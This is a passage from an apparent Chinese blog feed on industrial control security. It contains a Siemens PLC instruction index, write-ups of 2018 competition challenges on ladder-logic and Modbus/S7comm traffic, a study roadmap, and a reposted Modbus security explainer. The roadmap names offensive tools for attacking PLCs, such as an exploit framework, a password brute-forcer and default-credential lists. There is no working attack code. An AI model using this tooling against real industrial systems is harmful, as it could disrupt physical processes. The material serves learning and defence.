7.6 DIV_I 整数除法 7.7 ADD_DI 双整数加法 7.8 SUB_DI 双整数减法 7.9 MUL_DI 双整数乘法 7.10 DIV_DI 双整数除法 7.11 MOD_DI 回送余数的双整数 浮点算术运算指令8.1 浮点算术运算指令概述 8.2 判断浮点算术运算指令后状态字的位 8.3 基础指令 8.3.1 ADD_R实数加法 8.3.2 SUB_R实数减法 8.3.3 MUL_R实数乘法 8.3.4 DIV_R实数除法 8.3.5 ABS浮点数绝对值运算 8.4 扩展指令 8.4.1 SQR浮点数平方 8.4.2 SQRT浮点数平方根 8.4.3 EXP浮点数指数运算 8.4.4 LN浮点数自然对数运算 8.4.5 SIN浮点数正弦运算 8.4.6 COS浮点数余弦运算 8.4.7 TAN浮点数正切运算 8.4.8 ASIN浮点数反正弦运算 8.4.9 ACOS浮点数反余弦运算 8.4.10 ATAN浮点数反正切运算 赋值指令9.1 MOVE赋值 程序控制指令10.1 程序控制指令概述 10.2 -(Call)从线圈调用FC/SFC(无参数) 10.3 CALL_FB从方块调用FB 10.4 CALL_FC从方块调用FC 10.5 CALL_SFB从方块调用SFB 10.6 CALL_SFC从方块调用SFC 10.7 调用多北京块 10.8 从库中调用块 10.9 使用MCR功能的重要注意事项 10.10 -(MCR&lt;)主控继电器接通 10.11 -(MCR&gt;)主控继电器断开 10.12 -(MCRA)主控继电器启动 10.13 -(MCRD)主控继电器停止 10.14 -(RET)返回 移位和循环指令11.1 移位指令 11.1.1 移位指令概述 11.1.2 SHR_I整数右移 11.1.3 SHR_DI双整数右移 11.1.4 SHL_W字左移 11.1.5 SHR_W字右移 11.1.6 SHL_DW双字左移 11.1.7 SHR_DW双字右移 11.2 循环指令 11.2.1 循环指令概述 11.2.2 ROL_DW双字左循环 11.2.3 ROR_DW双字右循环 状态位指令12.1 状态位指令概述 12.2 OV -||- 溢出异常位 12.3 OS -||- 存储溢出异常位 12.4 UO -||- 无序异常位 12.5 BR -||- 异常位二进制结果 12.6 ==0-||- 结果位等于&quot;0&quot; 12.7 &lt;&gt;0-||- 结果位不等于&quot;0&quot; 12.8 &gt;0-||- 结果位大于&quot;0&quot; 12.9 &lt;0-||- 结果位小于&quot;0&quot; 12.10 &gt;=0-||- 结果位大于等于&quot;0&quot; 12.11 &lt;=0-||- 结果位小于等于&quot;0&quot; 定时器指令13.1 定时器指令概述 13.2 存储区中定时器的存储单元和定时器的组成部分 13.3 S_PULSE脉冲S5定时器 13.4 S_PEXT扩展脉冲S5定时器 13.5 S_ODT接通延时S5定时器 13.6 S_ODTS保持型接通延时S5定时器 13.7 S_OFFDT断电延时S5定时器 13.8 -(SP)脉冲定时器线圈 13.9 -(SE)扩展脉冲定时器线圈 13.10 -(SD)接通延时定时器线圈 13.11 -(SS)保持型接通延时定时器线圈 13.12 -(SF)断开延时定时器线圈 字逻辑指令14.1 字逻辑指令概述 14.2 WAND_W字和字相&quot;与&quot; 14.3 WOR_W字和字相&quot;或&quot; 14.4 WAND_DW双字和双字相&quot;与&quot; 14.5 WOR_DW双字和双字相&quot;或&quot; 14.6 WXOR_W字和字相&quot;异或&quot; 14.7 WXOR_DW双字和双字相&quot;异或]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>ICS</tag>
        <tag>plc</tag>
        <tag>梯形图</tag>
        <tag>西门子</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[梯形图计算writeup]]></title>
    <url>%2F2018%2F08%2F05%2F%E6%A2%AF%E5%BD%A2%E5%9B%BE%E8%AE%A1%E7%AE%97writeup%2F</url>
    <content type="text"><![CDATA[2018年工业信息安全技能大赛(华中赛区)两道梯形图计算题，请教了学弟记录一下write up 梯形图计算1问题分析当M0.0=1时，PLC程序的运算结果为多少？ 题解全都是Q0.1决定的，所以Q0.1肯定是1。程序段3这里是模拟信号5.04500010^001=50.45程序段3这里是模拟信号4.00000010^001=40OUT为50.4540=2018flag是**2018*** 梯形图计算2问题分析当M10.0=1时，PLC程序的运算结果为多少？ 题解：逆向分析先看程序段4，求Tag_10,是由Tag_9和Tag_8决定的，并且Tag_2一定是1，Tag_8，Tag_9是SWAP的关系 再看程序段3，Tag_8 = Tag_7 100再看程序段2，Tag_7 = Tag_4再看程序段2，Tag_4 = 5可以推出：Tag_4：5Tag_7：5Tag_8：500==0x01f4==0000000111110100Tag_9：0xf401==1111010000000001Tag_10：5f5f]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>ICS</tag>
        <tag>ctf</tag>
        <tag>write up</tag>
        <tag>plc</tag>
        <tag>梯形图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工控流量分析writeup]]></title>
    <url>%2F2018%2F08%2F04%2F%E5%B7%A5%E6%8E%A7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90writeup%2F</url>
    <content type="text"><![CDATA[2018年工业信息安全技能大赛(华中赛区)的几道流量分析题，抽时间写一下write up 工业协议分析3先过滤modbus的包，保存为分组字节流502.pcap再用流量分析脚本（ics_packet_analysis.py），按照数据包长度分流，可以吧不同长度的数据包分处理，方便分析直接打印出了这个数据包且将这个数据包以pcap的形式存储下来，用wireshark打开，分析可知这个长度全部都是Wirte Multiple Register功能的包，仔细分析一下发现可以字符串，modbus中通信是一发一收，不可能有连续的可见数据，可判断这就是恶意流量尝试16进制解密字符串，拿到flag 工业协议分析4由于流量脚本分析工具只能识别pcap包，所以这里要转换一下wireshark打开，导出特定分组字节，保存位pcap格式即可顺便在过滤一下与工控流量无关的包继续用流量分析脚本工具，分流，分析分析一下，例如长度为40的包 没有数据，所以不是要分析的modbus的包，我们来看长度为52的这个包packets_52.pcap有Read Coils，Read Holiding Registers，Read Input Register三种功能的包，但都是正常的寄存器读写操作，没有异常流量再看长度为115的包，是s7comm协议追踪TCP流，转为Hex去看，然后找不到……回过头在分组字节流重新找，找到有一个重传的异常包16进制解码4943532657696e7365637572697479，拿到flag 电力系统协议分析直接追踪流，转为Hex转储分析分析可知，这里似乎列出一个文件目录然后似乎就是一直打开文件，读取文件，关闭文件这里追踪到可疑文件flag就是这filedata中的数据61850@102 PLC通信协议分析这道题问设备地址，私有协议比较难分析，最后也没做出来…后来想想设备地址似乎就两位16进制数，按照比赛要求同一道题两次提交时间间隔30s，也就是说爆破flag似乎也就是只用两个小时…emmm还是我们太乖了…]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>ICS</tag>
        <tag>modbus</tag>
        <tag>ctf</tag>
        <tag>write up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工控学习主要科目]]></title>
    <url>%2F2018%2F08%2F03%2F%E5%B7%A5%E6%8E%A7%E5%AD%A6%E4%B9%A0%E4%B8%BB%E8%A6%81%E7%A7%91%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[工业控制系统概述目的：简单的了解什么是工业控制系统、工业控制系统框架、工业控制系统安全现状等理论基础知识，在对工业控制系统有了一定的了解后在展开实践。学习方法：通过网上搜集相关资料进行学习，最好直接看一些工控安全的相关书籍，书籍里都讲的很清楚。下面推荐几本入门书籍：1.《黑客大曝光：工业控制系统安全》2.《工业控制网络安全技术与实践》3.《S7-300/400 PLC应用技术》4…… 工业控制系统的组态和编程目的：了解PLC的架构与特点，认识PLC的硬件及网络组态、学习PLC程序的基础编写，使用TIA对S7-300进行硬件组态和PLC编程。学习方法：学会控制器的组态方法，多看说明文档，能够读懂简单的梯形图控制逻辑和其他的基于IEC61131-3的五种工控编程语言，并进行简单的编程，使用真实的PLC设备进行实操，如国内外的PLC，西门子、施耐德、ABB、和利时、大工计控、优稳……（一般入门都是从西门子的PLC开始）设备能够跑起来是第一步，接下来就可以做一些事了。 常用的工业控制系统协议分析要求：分析常用的工业以太网协议，如Modbus、S7comm、IEC61850、EtherNet/IP、DNP3、EPA等等协议，了解这些工业以太网协议的协议规范和存在的安全性问题。学习方法：有真实设备的可以直接使用真实设备进行分析、无真实设备的可以从网上下载相关的协议数据包进行离线分析，通过对协议的不断了解，要形成对这些协议的模糊测试工具。 工控软硬件漏洞挖掘工业控制系统的漏洞挖掘主要包含三部分，上位机软件漏洞挖掘、工控协议的漏洞挖掘，控制器设备固件漏洞挖掘。其中最简单的是工控协议漏洞挖掘，上手比较快，需要具备一定的工控协议逆向能力，其他两方面需要一定的基础才能精心研究。学习方法：首先对协议进行分析，然后编写模糊测试脚本，最后进行测试和分析。开始研究是可以找一些已有的漏洞，先复现他的攻击过程，在分析器攻击机理，从而能够举一反三，发掘0day漏洞。 工控系统攻击工具使用想要做一些工控安全的研究，光靠自己琢磨效率低下，需要借助前人已有的成果进行研究和学习。其中涉及到很多实用的工具，我们需要建立自己的工具集，这里列出一些常用的工具：（1）S7 Client Demo开源的S7协议库”snap7“基础上进行开发的，主要支持西门子的S7-300/s7-400设备，可以直接连接西门子的控制器，获取控制器上的设备信息（如固件版本，块信息等），还可以直接操作控制器的CPU的启停。（2）PLCSCAN、NMAP中的工控设备扫描模块通过探测设备，获取关于设备的供应商类型、模块信息等，目前仅支持S7协议与MODBUS协议。（3）ISF该框架主要使用Python语言开发，集成了ShadowBroker释放的NSA工具Fuzzbunch攻击框架，是一款适合工控漏洞利用的框架。其中集成很多常用的针对工控安全的攻击集。（4）GrassMarlinGRASSMARLIN是一款由美国国家安全局开发的，能够帮助运维工程师在IP网络上发现并编目监控和数据采集系统（SCADA）和工业控制系统（ICS）主机的开源软件工具，也被称为被动网络映射器。其数据源十分多样化，包括PCAP文件、路由器和交换机配置文件、CAM表以及实时网络数据包的捕获。该工具能够自动识别可用网络，生成网络拓扑，实现主机间通信的可视化，还能够展示从主机通信中所提取的元数据。（5）S7-Brute-OfflineS7密码离线暴力破解工具。（6）SCADA_Metasploit_Modules列举了MSF上所有的针对工业控制系统的漏洞脚本。（7）Scada_Password列举了工业控制系统中的常见的用户和密码。（8）SmodModbus模糊测试工具。（9）PLCinject（10）Modscan（11）…这里就不一一列举了，用到的使用自己去找吧，最后我这里给出几个github上对工控资源整合的网站：https://github.com/zhangdebiao/icsmasterhttps://github.com/zhangdebiao/ICS-Security-Toolshttps://github.com/zhangdebiao/awesome-industrial-control-system-security &emsp;&emsp;&emsp;FREEBUF这几个链接中整合了国内外和工控安全相关的顶会文章，工控系统的利用脚本、常用的攻击工具、工控协议相关的数据包和协议文档等等。]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>ICS</tag>
        <tag>工控安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Modbus学习笔记]]></title>
    <url>%2F2018%2F08%2F03%2FModbus%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[术语 校验码校验码是由前面的数据通过某种算法得出的，用以检验该组数据的正确性。代码作为数据在向计算机或其它设备进行输入时，容易产生输入错误，为了减少这种输入错误，编码专家发明了各种校验检错方法，并依据这些方法设置了校验码。常用的校验有：累加和校验SUM、字节异或校验XOR、纵向冗余校验LRC、循环冗余校验CRC…… 离散量输入主要用来读取单个位的数据，如IO的状态； 线圈开关输出信号，主要用来写入单个位的数据，与离散量构成组成对位的操作； 输入寄存器主要用来读取16位，也就是两个字节的数据； 保持寄存器主要用来写入16位的数据。 PLC可编程逻辑控制器，是一种采用一类可编程的存储器，用于其内部存储程序，执行逻辑运算、顺序控制、定时、计数与算术操作等面向用户的指令，并通过数字或模拟式输入/输出控制各种类型的机械或生产过程。 串口通信随着计算机系统的应用和微机网络的发展，通信功能越来越显得重要.这里所说的通信是指计算机与外界的信息交换.因此，通信既包括计算机与外部设备之间，也包括计算机和计算机之间的信息交换.由于串行通信是在一根传输线上一位一位的传送信息，所用的传输线少，并且可以借助现成的电话网进行信息传送，因此，特别适合于远距离传输.对于那些与计算机相距不远的人－机交换设备和串行存储的外部设备如终端、打印机、逻辑分析仪、磁盘等，采用串行方式交换数据也很普遍.在实时控制和管理方面，采用多台微机处理机组成分级分布控制系统中，各 CPU 之间的通信一般都是串行方式.所以串行接口是微机应用系统常用的接口。许多外设和计算机按串行方式进行通信，这里所说的串行方式，是指外设与接口电路之间的信息传送方式，实际上，CPU 与接口之间仍按并行方式工作. 串口串口是计算机上一种非常通用设备通信的协议，不要与通用串行总线Universal Serial Bus（USB）混淆。大多数计算机包含两个基于RS232的串口。串口同时也是仪器仪表设备通用的通信协议；很多GPIB兼容的设备也带有RS-232口。同时，串口通信协议也可以用于获取远程采集设备的数据。串口通信的概念非常简单，串口按位（bit）发送和接收字节。尽管比按字节（byte）的并行通信慢，但是串口可以在使用一根线发送数据的同时用另一根线接收数据。它很简单并且能够实现远距离通信。比如IEEE488定义并行通行状态时，规定设备线总常不得超过20米，并且任意两个设备间的长度不得超过2米；而对于串口而言，长度可达1200米。典型地，串口用于ASCII码字符的传输。通信使用3根线完成：（1）地线，（2）发送，（3）接收。由于串口通信是异步的，端口能够在一根线上发送数据同时在另一根线上接收数据。其他线用于握手，但是不是必须的。串口通信最重要的参数是波特率、数据位、停止位和奇偶校验。对于两个进行通行的端口，这些参数必须匹配： 波特率这是一个衡量通信速度的参数。它表示每秒钟传送的bit的个数。例如300波特表示每秒钟发送300个bit。当我们提到时钟周期时，我们就是指波特率。例如如果协议需要4800波特率，那么时钟是4800Hz。这意味着串口通信在数据线上的采样率为4800Hz。通常电话线的波特率为14400，28800和36600。波特率可以远远大于这些值，但是波特率和距离成反比。高波特率常常用于放置的很近的仪器间的通信，典型的例子就是GPIB设备的通信。 数据位这是衡量通信中实际数据位的参数。当计算机发送一个信息包，实际的数据不会是8位的，标准的值是5、7和8位。如何设置取决于你想传送的信息。比如，标准的ASCII码是0～127（7位）。扩展的ASCII码是0～255（8位）。如果数据使用简单的文本（标准 ASCII码），那么每个数据包使用7位数据。每个包是指一个字节，包括开始/停止位，数据位和奇偶校验位。由于实际数据位取决于通信协议的选取，术语“包”指任何通信的情况。 停止位用于表示单个包的最后一位。典型的值为1，1.5和2位。由于数据是在传输线上定时的，并且每一个设备有其自己的时钟，很可能在通信中两台设备间出现了小小的不同步。因此停止位不仅仅是表示传输的结束，并且提供计算机校正时钟同步的机会。适用于停止位的位数越多，不同时钟同步的容忍程度越大，但是数据传输率同时也越慢。 奇偶校验位在串口通信中一种简单的检错方式。有四种检错方式：偶、奇、高和低。当然没有校验位也是可以的。对于偶和奇校验的情况，串口会设置校验位（数据位后面的一位），用一个值确保传输的数据有偶个或者奇个逻辑高位。例如，如果数据是011，那么对于偶校验，校验位为0，保证逻辑高的位数是偶数个。如果是奇校验，校验位位1，这样就有3个逻辑高位。高位和低位不真正的检查数据，简单置位逻辑高或者逻辑低校验。这样使得接收设备能够知道一个位的状态，有机会判断是否有噪声干扰了通信或者是否传输和接收数据是否不同步。 背景早在1971年，Modicon公司首次推出了Modbus协议，ModbusRTU和Modbus ASCII诞生于此。后来施耐德电气（SchneiderElectric）收购了Modicon公司，并在1997年推出了ModbusTCP协议。2004年，中国国家标准委员会正式把Modbus作为了国家标准，开启了Modbus为中国工业通信做贡献的时代。通过此协议，控制器相互之间、控制器经由网络和其它设备之间可以通信。Modbus协议具有标准、开放，可以支持多种电气接口，数据帧格式简单紧凑，数据传输量大、实时性好等特点，在工业控制系统中得到了广泛的应用，已经成为通用工业标准。深入分析Modbus协议实现原理和其安全性对提高工控系统安全性有着重要的现实意义。ModbusRTU和ModbusASCII主要用于串行通信领域，而ModbusTCP则常用于以太网通信。现在，Modbus已经成为工业领域通信协议标准，并且现在是工业电子设备之间相当常用的连接方式。 协议原理Modbus使用一种简单的MasterandSlave主从协议（客户机/服务器协议）进行通信。客户机作为主站，向服务器发送请求；服务器（从站）接到请求后，对请求进行分析并作出应答。其中使用的通信帧被称为应用数据单元（Application Data Unit，ADU），它包括通信地址段、功能代码段、数据段和校验段，如下图：一般使用上，监控系统(HMI)都为Master，PLC、电表、仪表等都为Slave，HMI系统一直PollingSlave的各种relayandregister最新数值，然后做显示及各种逻辑计算及控制调整等处理。其中，功能代码段和数据段组合称为协议数据单元（Protocol Data Unit or Protocol Description Unit)，PDU）。功能代码段占用一个字节，取值范围为1~255，其中128~255为保留值，用于异常消息应答报文。1~127为功能代码编号，其中65~72和100~110为用户自定义编码，具体请看下面这张图片： 传输方式Modbus 协议是一种应用层报文传输协议，包括ASCII、ＲTU、TCP三种报文类型，协议本身并没有定义物理层，只是定义了控制器能够认识和使用的消息结构，而不管它们是经过何种网络进行通信的。Modbus 协议使用串口传输时可以选择ＲTU或ASCII模式，并规定了消息、数据结构、命令和应答方式并需要对数据进行校验。ASCII 模式采用LＲC校验，ＲTU模式采用16 位CＲC校验。通过以太网传输时使用TCP，这种模式不使用校验，因为TCP协议是一个面向连接的可靠协议。 Modbus RTU和Modbus ASCII有什么区别？Modbus是一种应用层协议，它定义了与基础网络无关的数据单元（ADU），可以在以太网（TCP/IP）或串行链路上（RS232、RS485等）进行通信（以太网ADU和串行ADU略有不同）。在串行链路上，Modbus协议有两种传输模式——ASCII模式和RTU模式。其中，ASCII是英文“American Standard Code for Information Interchange”的缩写，中文翻译为“美国国家信息交换标准编码”；RTU是英文“ Remote Terminal Unit”的缩写，中文翻译为“远程终端设备”。 Modbus的工作原理Modbus采用主从（Master-Salve）通信模式，仅有主设备（Master）能对传输进行初始化，从设备（Slave）根据主设备的请求进行应答。典型的主设备包括现场仪表和显示面板，典型的从设备为可编程逻辑控制器（PLC）。在串行链路的主从通信中，Modbus主设备可以连接一个或N（最大为247）个从设备，主从设备之间的通信包括单播模式和广播模式。在广播模式中，Modbus主设备可同时向多个从设备发送请求（设备地址0用于广播模式），从设备对广播请求不进行响应。在单播模式中，主设备发送请求至某个特定的从设备（每个Modbus从设备具有唯一地址），请求的消息帧中会包含功能代码和数据，比如功能代码“01”用来读取离散量线圈的状态。从设备接到请求后，进行应答并把消息反馈主设备。 两种模式在主从设备的通信中，可以使用ASCII模式或者RTU模式。在ASCII（AmericanStandard Code for Information Interchange）传输模式下，消息帧以英文冒号（“：”，ASCII3A Hex）开始，以回车和换号（CRLF，ASCII 0D and 0A Hex）符号结束，允许的传输的字符集为十六进制的0~9和A~F；网络中的从设备监视传输通路上是否有英文冒号（“：”），如果有的话，就对消息帧进行解码，查看消息中的地址是否与自己的地址相同，如果相同的话，就接收其中的数据；如果不同的话，则不予理会。在ASCII模式下，每个8位的字节被拆分成两个ASCII字符进行发送，比如十六进制数0xAF ,会被分解成ASCII字符“A”和“F”进行发送，发送的字符量比RTU增加一倍。ASCII模式的好处是允许两个字符之间间隔的时间长达1s而不引发通信故障，该模式采用纵向冗余校验（Longitudinal Redundancy Check ，LRC)） 的方法来检验错误，当控制器设为在Modbus 网络上以ＲTU 模式通信，消息中的每个8Bit 字节都包含两个4 Bit 的十六进制字符，这种模式没有开始和结束标记。其优点是: 在同样的波特率下，可比传送更多的数据。在RTU（RemoteTerminal Unit）模式下，每个字节可以传输两个十六进制字符，比如十六进制数0xAF，直接以十六进制0xAF（二进制：10101111）进行发送，因此它的发送密度比ASCII模式高一倍；RTU模式采用循环冗余校验（CRC），下面是对RTU模式的总结：具体格式如图 所示。 MODBUS ASCII和RTU两种模式的区别、优缺点下表是MODBUS ASCII协议和RTU协议的比较： 协议 开始标记 结束标记 校验 传输效率 程序处理 ASCII :（冒号） CR,LF LRC 低 直观，简单，易调试 RTU 无 无 CRC 高 稍复杂 从上表的比较我们可以看到，MODBUS的ASCII协议和RTU协议相比，MODBUS ASCII协议拥有开始和结束标记，而MODBUS RTU却没有，所以ASCII协议的程序中对数据包的处理能更加方便。MODBUS ASCII协议的DATA域传输的都是可见的ASCII字符，因此在调试阶段就显得更加直观，另外它的LRC校验程序也比较容易编写，这些都是MODBUS ASCII的优点。MODBUS ASCII的主要缺点是传输效率低，因为它传输的都是可见的ASCII字符，原来用RTU传输的数据每一个字节，用ASCII的话都要把这个字节拆分两个字节，比如RTU传输一个十六进制数0xF9，ASCII就需要传输字符’F’和字符’9’，对应的ASCII码0x46和0x39两个字节，这样它的传输的效率肯定就比RTU低。所以一般来说，如果所需要传输的数据量较小可以考虑使用ASCII协议，如果所需传输的数据量比较大，最好能使用RTU协议。 另外，由于ASCII协议有开始标志和结束标志，所以一个数据包之间的各字节间的传输间隔时间可以大于1秒，而MODBUS RTU方式下，由于没有规定开始和结束标记，所以协议规定每两个字节之间发送或者接收的时间间隔不能超过3.5倍字符传输时间。如果两个字符时间间隔超过了3.5倍的字符传输时间，就认为一帧数据已经接收，新的一帧数据传输开始，所以RTU方式下两个字节间传输间隔有时间要求。MODBUS 的ASCII和RTU两种协议的这一区别可能决定某些应用场合只能选用其中一种协议。 MODBUS TCP注意点主机和从机、服务端和客户端【在modbus协议中】主机发送modbus请求，从机根据请求内容向主机返回响应。在modbus协议中，主机总是主动方，从机总是被动方。 【在网络应用中】在网络应用中存在客户端和服务器端，客户端（例如浏览器）发送请求到服务器，服务器向客户端返回内容（例如HTML文本）。 【在modbus tcp中】主机是客户端，而从机是服务器端。千万不要以为服务器端重要，主机也重要，所以主机就是服务器端。 是否可以多主机通过前面的分析，主机为客户端那么modbustcp支持多个主机，在一个局域网中可存在多个主机和多个从机。从机的连接能力（连接主机的数量）由uIP的最大TCP连接个数决定。 modbus TCP协议简述modbus TCP和modbus RTU基本相同，但是也存在一些区别a.从机地址变得不再重要，多数情况下忽略。从某种意义上说从机地址被IP地址取代b.CRC校验变得不再重要，甚至可以忽略。由于TCP数据包中已经存在校验，为了不重复造轮子，modbus TCP干脆取消了CRC校验。TCP 模式是为了让Modbus 数据顺利在以太网上传输产生的，使用TCP502 端口。该协议物理层，数据链路层，网络层，传输层都是基于TCP 协议，只在应用层，将Modbus 协议修改后封装进去; 接收端将该TCP 数据包拆封后，重新获得原始Modbus 帧，然后按照Modbus 协议规范进行解析，并将返回的数据包重新封装进TCP 协议中，返回到发送端。与串行链路传输的数据格式不同，TCP 模式去除了附加地址和校验，增加了报文头，其具体格式如下图所示。在modbus TCP中包含一个MBAP头，该头包含以下几个部分 区域 长度 描述 客户端 服务器 传输标志 2字节 MODBUS 请求和响应传输过程中序列号 客户端生成 应答时复制该值 协议标志 2字节 Modbus协议默认为0 客户端生成 应答时复制该值 长度 2字节 剩余部分的长度 客户端生成 应答时由服务器端生成 单元标志 1字节 从机标志（从机地址） 客户端生成 应答时复制该值 【注意】 【1】传输标志可理解为序列号，防止 MODBUS TCP通信错位，例如后发生的响应先到了主机，而早发生的响应后到主机 【2】单元标志可理解为从机地址，此时已经不再重要 modbus tcp 和 TCP IP的关系modbus TCP可以理解为发生在TCP上的应用层协议，既然是TCP协议那么一个完整的MODBUSTCP报文必然包括TCP首部，IP首部和Ethernet首部。 功能码作用启动Modbus事务处理的客户机创建Modbus应用数据单元。功能码（PDU中的）向服务器指示将执行哪种操作。用一个字节编码Modbus数据单元的功能码域。有效范围是十制制1-255（128-255为异常响应保留）。当从客户机向服务器发送报文时，功能码域通过服务器执行哪种操作。从客户机向服务器发送的报文数据域包括附加信息，服务器使用这个信息执行功能码定义的操作。这个域还包括离散项目和寄存器地址、处理项目的数量以及域中的实际数据字节数。在某种请求中，数据域可以是不存在的，在此情况下服务器不需要任何附加信息。功能码仅说明操作。 功能码的类型功能码主要分为有效功能码、异常功能码和错误功能码。如果在一个正确接收Modbus ADU中，不出现与请求Modbus功能有关的差错，那么服务器至客户机的响应数据会包含请求中的正常功能码。如果出现与请求Modbus功能有关的差错，那么响应数据会包含一个异常码和错误码。例如，客户机能够读一组离散量输出或输入的开/关状态，或者用户能够读/写一组寄存器数据内容。当服务器对客户机响应时，它使用功能码域来指示正常（无差错）响应或出现某种差错（称为异常响应）。对于一个正常响应来说，服务器仅对原始功能码响应，对于异常响应，服务器返回一个与客户机等同的码，设置该原始功能码的最高有效位为逻辑1，并加该异常码后增加错误码，以通知客户机异常原因。 有效功能码有效功能码有二十几种，但是一般使用上都以1、2、3、4、5、6、15、16等八种最为常用，以及另外特殊使用的20、21两种，此为General Reference Register，绝大部份的Modbus设备并不会提供此Register。于PLC上主要的控制数据有下列四种型式。此八种功能码就是处理这些控制资料，详细说明如下各点： 控制数据四种型式DI：DigitalInput （数字输入，离散输入），一个地址一个数据位，用户只能读取它的状态，不能修改。以一个 bit表示 On/Off，用来记录控制信号的状态输入，例如：开关，接触点，马达运转，超限switch…等等。于PLC上被称为Input relay、input coil等。DO：DigitalOutput（数字输出，线圈输出），一个地址一个数据位，用户可以置位、复位，可以回读状态。以一个 bit表示 On/Off，用来输出控制信号，以激活或停止马达，警铃，灯光…等等。于PLC上被称为Output relay、Output coil等。AI：Analog Input（模拟输入，输入寄存器），一个地址16位数据，用户只能读，不能修改，，以16 bits integer表示一个数值，用来记录控制信号的数值输入，例如：温度、流量、料量、速度、转速、文件板开度、液位、重量…等等。于PLC上被称为Input register。AO：AnalogOutput（模拟输出，保持寄存器），一个地址16位数据，用户可以写，也可以回读，以16 bits integer表示一个数值，用来输出控制信号的数值，例如：温度、流量、速度、转速、文件板开度、饲料量…等等设定值。于PLC上被称为Output register、Holding register。 Modbus 协议安全性分析Modbus 协议是典型的工控网协议，研究其安全性对于加强工业控制网络的安全性有重要意义。一般来说，协议安全性问题可以分为两种，一种是协议自身的设计和描述引起的安全问题; 另一种是协议的不正确实现引起的安全问题。Modbus 协议也存在着这两方面的问题。 Modbus 协议的固有问题绝大多数工控协议在设计之初，仅仅考虑了功能实现、提高效率、提高可靠性等方面，而没考虑过安全性问题。Modbus 协议也不例外，尽管其已经成为事实上的工业标准。从前面原理分析可以看出其本身的安全性问题是: 缺乏认证、授权、加密等安全防护机制和功能码滥用问题。 缺乏认证认证的目的是保证收到的信息来自合法的用户，未认证用户向设备发送控制命令不会被执行。在Modbus 协议通信过程中，没有任何认证方面的相关定义，攻击者只需要找到一个合法的地址就可以使用功能码就能建立一个Modbus 通信会话，从而扰乱整个或者部分控制过程。 缺乏授权授权是保证不同的特权操作需要由拥有不同权限的认证用户来完成，这样可大大降低误操作与内部攻击的概率。目前，Modbus 协议没有基于角色的访问控制机制，也没有对用户分类，没有对用户的权限进行划分，这会导致任意用户可以执行任意功能。 缺乏加密加密可以保证通信过程中双方的信息不被第三方非法获取。Modbus 协议通信过程中，地址和命令全部采用明文传输，因此数据可以很容易的被攻击者捕获和解析，为攻击者提供便利。 功能码滥用功能码是Modbus 协议中的一项重要内容，几乎所有的通信都包含功能码。目前，功能码滥用是导致Modbus 网络异常的一个主要因素。例如不合法报文长度，短周期的无用命令，不正确的报文长度，确认异常代码延迟等都有可能导致拒绝服务攻击。 协议实现产生的问题虽然Modbus 协议获得了广泛的应用，但是在实现具体的工业控制系统时，开发者并不具备安全知识或者没有意识到安全问题。这样就导致了使用Modbus 协议的系统中可能存在各种各样的安全漏洞。 设计安全问题Modbus 系统开发者重点关注的是其功能实现问题，安全问题在设计时很少被注意到。设计安全是指设计时充分考虑安全性，解决Modbus 系统可能出现的各种异常和非法操作等问题。比如在通信过程中，某个节点被恶意控制后发出非法数据，就需要考虑这些数据的判别和处理问题。 缓冲区溢出漏洞缓冲区溢出是指在向缓冲区内填充数据时超过了缓冲区本身的容量导致溢出的数据覆盖在合法数据上，这是在软件开发中最常见也是非常危险的漏洞，可以导致系统崩溃，或者被攻击者利用来控制系统。Modbus 系统开发者大多不具备安全开发知识，这样就会产生很多的缓冲区溢出漏洞，一旦被恶意者利用会导致严重的后果。 Modbus TCP 安全问题目前，Modbus 协议已经可以在通用计算机和通用操作系统上实现，运行于TCP /IP 之上以满足发展需要。这样，TCP /IP 协议自身存在的安全问题不可避免地会影响到工控网络安全。非法网络数据获取，中间人，拒绝服务， IP 欺骗，病毒木马等在IP 互联网中的常用攻击手段都会影响Modbus 系统安全。 安全建议目前，Modbus 系统采取的安全防护措施普遍不足，这里参考信息安全业内研究并结合工控系统自身的安全问题，提出了一些安全建议，能够有效地降低工业控制系统面临的威胁。 从源头开始工控网络漏洞，很大一部分是其实现过程出现的漏洞。如果从源头开始控制，从Modbus 系统的需求设计、开发实现、内部测试和部署等阶段，全生命周期的介入安全手段，融入安全设计、安全编码以及安全测试等技术，可以极大地消除安全漏洞，降低整个Modbus 系统的安全风险。 异常行为检测异常行为代表着可能发生威胁，不管是有没有攻击者，因此开发针对Modbus 系统的专用异常行为检测设备可以极大提高工控网络的安全性。针对Modbus 系统，首先要分析其存在的各种操作行为，依据“主体，地点，时间，访问方式，操作，客体”等行为描述成一个六元组模型; 进而分析其行为是否属于异常; 最终决定采取记录或者报警等措施。 安全审计Modbus 的安全审计就是对协议数据进行深度解码分析，记录操作的时间、地点、操作者和操作行为等关键信息，实现对Modbus 系统的安全审计日志记录和审计功能，从而提供安全事件爆发后的时候追查能力。 使用网络安全设备使用入侵防御和防火墙等网络安全设备。防火墙是一个串行设备，通过设置，只允许特定的地址访问服务端，禁止外部地址访问Modbus 服务器，可以有效的防止外部入侵; 入侵防御设备可以分析Modbus协议的具体操作内容，有效地检测并阻止来自内部/外部的异常操作和各种渗透攻击行为，对内网提供保护功能。PS：本篇文章转载自FREEBUF]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>ICS</tag>
        <tag>modbus</tag>
        <tag>工控协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[智能设备硬件安全测试]]></title>
    <url>%2F2018%2F08%2F02%2F%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%2F</url>
